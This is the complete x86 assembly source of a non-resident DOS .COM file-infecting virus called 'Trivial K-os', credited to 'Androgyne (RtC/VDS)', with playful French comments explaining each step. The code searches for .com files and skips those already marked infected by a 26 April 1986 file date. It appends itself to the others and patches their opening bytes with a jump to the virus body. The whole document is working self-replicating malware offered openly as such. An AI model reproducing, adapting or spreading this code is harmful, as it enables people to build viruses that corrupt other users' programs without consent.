;Trivial K-os (non residant com infector)
;a virus by Androgyne (RtC/VDS)

.model tiny                     ;une petite pile suffit.
.code                           ;c'est pour dire qu'on fait du code.

        org 100h                ;les .com commence toujours à cs:100h.

Host:                           ;c'est le programme hôte original.
    jmp Start                   ;on simule le saut que l'on va mettre dans un
    nop                         ;programme infecté.
    mov ax,4C00h                ;notre hôte ne fait que quitter.
    int 21h                     ;

    Start:                      ;c'est là que commence le virus.
    call Get_add                ;on calcule le décalage pour pouvoir adresser les
    Get_add:                    ;espaces mémoires de la fin.
    pop bp                      ;le décalage dû à l'adressage relatif
    sub bp,offset Get_add       ;est placé dans bp.

    call Move_DTA_add           ;on change l'adresse de la DTA.
    call Repair_host            ;on remet le début de l'hôte à sa place.
    call Search_com             ;on recherche un .com.
Search_loop:                    ;
    jz Exec_host                ;Y'en a-t-il un? non, on exécute l'hôte.
    call Open_file              ;oui, on l'ouvre.
    jc Exec_host                ;A-t-on réussit à l'ouvrir? non, on exécute l'hôte.
    call Is_infected            ;oui, on teste s'il est infecté. Est-il infecté?
    jz Next                     ;oui, on ne l'infecte pas.
    call Infect                 ;non, on infecte le fichier.
Next:                           ;
    call Close_file             ;on le referme.
    call Search_again           ;on cherche un autre .com.
    jmp Search_loop             ;et c'est reparti pour un tour...

Exec_host:                      ;exécution de l'hôte
    mov ax,100h                 ;l'adresse du début du .com est cs:100h
    push ax                     ;on l'empile
    ret                         ;et au revoir

Close_file:                     ;fermeture du fichier
    mov ah,3Eh                  ;
    int 21h                     ;
    ret                         ;

Move_DTA_add:                   ;changement d'adresse de la DTA
    push cs                     ;
    pop ds                      ;
    mov dx,offset DTA           ;on le met dans le buffer DTA (logique)
    add dx,bp                   ;on n'oublie pas de rajouter le décalage
    mov ah,1Ah                  ;on doit spécifier la nouvelle adresse en ds:dx
    int 21h                     ;on appelle l'interrupion 21h
    ret                         ;

Search_com:                     ;lancement d'une search first sur *.com
    push cs                     ;
    pop ds                      ;
    mov dx,offset com_file      ;on spécifie la chaîne de recherche dans ds:dx
    add dx,bp                   ;toujours le décalage
    mov cl,00100110b            ;les attributs de fichier
    mov ah,4Eh                  ;
    int 21h                     ;la DTA est actualisée
    cmp ax,18                   ;ax=18 signifie que la recherche est terminée
    ret                         ;

Open_file:                      ;ouverture du fichier
    mov al,2                    ;en mode lecture/écriture
    push cs                     ;
    pop ds                      ;
    mov dx,offset DTA + 1Eh     ;on spécifie le nom en ds:dx
    add dx,bp                   ;et redécalage
    mov ah,3Dh                  ;
    int 21h                     ;go
    mov bx,ax                   ;on place le file handle dans bx
    ret                         ;

Is_infected:                    ;test d'infection
    mov al,0                    ;on lit la date
    mov ah,57h                  ;
    int 21h                     ;on récupère la date en dx
    cmp dx,0C9Ah                ;est-ce le 26 avril 1986 ?
    ret                         ;

Infect:                         ;la grosse routine d'infection en 8 étapes

;(1) déplacement du pointeur de fichier au début du fichier

    xor cx,cx                   ;décalage de 0...
    xor dx,dx                   ; ...+ 0 = 0 (bravo)
    mov al,00                   ;au début du fichier
    mov ah,42h                  ;
    int 21h                     ;le pointeur pointe en dx:ax

;(2) récupération des 4 premiers octets du fichier                                       

    mov cx,4                    ;on récupère 4 octets
    push cs                     ;
    pop ds                      ;
    mov dx,offset begin         ;on spécifie l'adresse où les placer en ds:dx
    add dx,bp                   ;on décale comme d'habitude
    mov ah,3Fh                  ;
    int 21h                     ;lecture

;(3) déplacement du pointeur de fichier à la fin de fichier

    xor cx,cx                   ;décalage de 0...
    xor dx,dx                   ; ...+ 0 = 0 (que je suis forte!)
    mov al,02h                  ;à la fin du fichier
    mov ah,42h                  ;
    int 21h                     ;le pointeur pointe en dx:ax
    push ax                     ;on conserve ax au frais

;(4) écriture du virus à la fin du fichier

    mov cx,offset Fin - offset Start + 1    ;c'est la taille du virus
    push cs                     ;
    pop ds                      ;
    mov dx,offset Start         ;on spécifie l'origine des données en ds:dx
    add dx,bp                   ; ... (devinez ce que c'est!)
    mov ah,40h                  ;
    int 21h                     ;

;(5) déplacement du pointeur de fichier au début du fichier

    xor cx,cx                   ;décalage de 0...
    xor dx,dx                   ; ...+ 0 = 0 (j'aurais du faire maths sup!)
    mov al,00                   ;au début du fichier
    mov ah,42h                  ;
    int 21h                     ;le pointeur pointe en dx:ax

;(6) fabrication du jmp start à placer au début du fichier

    pop ax                      ;on va chercher le ax qu'on s'était mis au frais
    sub ax,3                    ;on enlève 3 (on saute à partir de cs:103h)
    mov byte ptr [bp + jmp_start],0E9h      ;ça veut dire jmp
    mov word ptr [bp + jmp_start + 1],ax    ;c'est le reste de l'instruction

;(7) écriture du jmp start fabriqué

        push cs                 ;
        pop ds                  ;
        mov dx,offset jmp_start ;on spécifie l'origine des données en ds:dx
        add dx,bp               ;décalage! (j'en ai marre de me répéter)
        mov cx,3                ;on écrit 3 octets
        mov ah,40h              ;
        int 21h                 ;

;(8) changement de date du fichier

        mov al,0                ;on lit d'abord
        mov ah,57h              ;
        int 21h                 ;on récupère la date en dx
        mov dx,0C9Ah            ;on la change en 26 avril 1986
        mov al,1                ;on la réinjecte dans le fichier
        mov ah,57h              ;
        int 21h                 ;et voilà, c'est fait

        ret                     ;c'est la fin de la routine d'infection

Search_again:                   ;lancement d'une search next sur *.com
        mov ah,4Fh              ;tout a déjà été fait pour la search first
        int 21h                 ;
        cmp ax,18               ;ax=18 signifie que la recherche est terminée
        ret                     ;

Repair_host:                    ;remise en place des octets déplacés
        push cs                 ;
        pop ds                  ;
        mov si,offset begin     ;ds:si pointe sur le buffer begin
        add si,bp               ;pour la dernière fois, on décale
        push cs                 ;
        pop es                  ;
        mov di,100h             ;es:di pointe au début de l'hôte
        mov cx,4                ;il y a 4 octets
        rep movsb               ;déplace les octets de ds:si à es:di
        ret                     ;


com_file        db '*.com$'     ;sert à search first et search next
begin           db 4 dup (90h)  ;c'est là qu'il y a le vrai début de l'hôte
jmp_start       db 3 dup (0)    ;ici, on fabrique le jmp start
DTA             db 43 dup (0)   ;voilà la nouvelle DTA

Fin:                            ;ce n'est qu'un au revoir...

end Host